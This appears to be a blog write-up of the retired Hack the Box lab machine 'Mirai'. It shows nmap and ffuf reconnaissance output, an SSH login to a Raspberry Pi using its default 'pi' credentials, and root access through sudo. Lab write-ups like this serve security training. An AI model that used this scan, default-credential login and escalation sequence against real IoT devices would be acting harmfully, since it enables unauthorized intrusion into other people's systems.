---
layout: post
title: Hack the Box - Mirai
date: 2020-07-02 20:51:22 +0100
description: Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.
img: mirai.png
fig-caption: Mirai
categories: HackTheBox
tags: [Easy, Linux, Retired, CTF]
---
## Overview
Mirai demonstrates one of the fastest-growing attack vectors in modern times; improperly configured IoT devices. This attack vector is constantly on the rise as more and more IoT devices are being created and deployed around the globe, and is actively being exploited by a wide variety of botnets. Internal IoT devices are also being used for long-term persistence by malicious actors.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
└─$ sudo nmap -p22,53,80,1058,32400,32469 10.129.114.18 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 21:12 GMT
Nmap scan report for 10.129.114.18
Host is up (0.016s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
1058/tcp  open  nim
32400/tcp open  plex
32469/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
                                                                                                                                                                                                                                             
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
└─$ sudo nmap -p22,53,80,1058,32400,32469 -sV 10.129.114.18
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 21:12 GMT
Nmap scan report for 10.129.114.18
Host is up (0.016s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
1058/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```
After port enumeration there were a couple of interesting ports that could be investigated. However starting with the webserver on port 80, which returns a blank page at the root, we'll start with running a fuzzer.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.114.18/FUZZ            

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.114.18/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
versions                [Status: 200, Size: 18, Words: 1, Lines: 1]
```
The fuzzer reveals a couple of interesting pages. Navigating to the admin page we find a raspberry pi admin interface. On seeing this there is a chance the well known default credentials for SSH to Raspberry Pi's may work.
## Foothold
When trying the default credentials it was successful and access was granted.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/mirai]
└─$ ssh pi@10.129.114.18                                   
pi@10.129.114.18's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```
## Privilege Escalation
Privilege escalation was trivial as the user pi was in the sudoers list.
```
pi@raspberrypi:~ $ sudo bash
root@raspberrypi:/home/pi#
```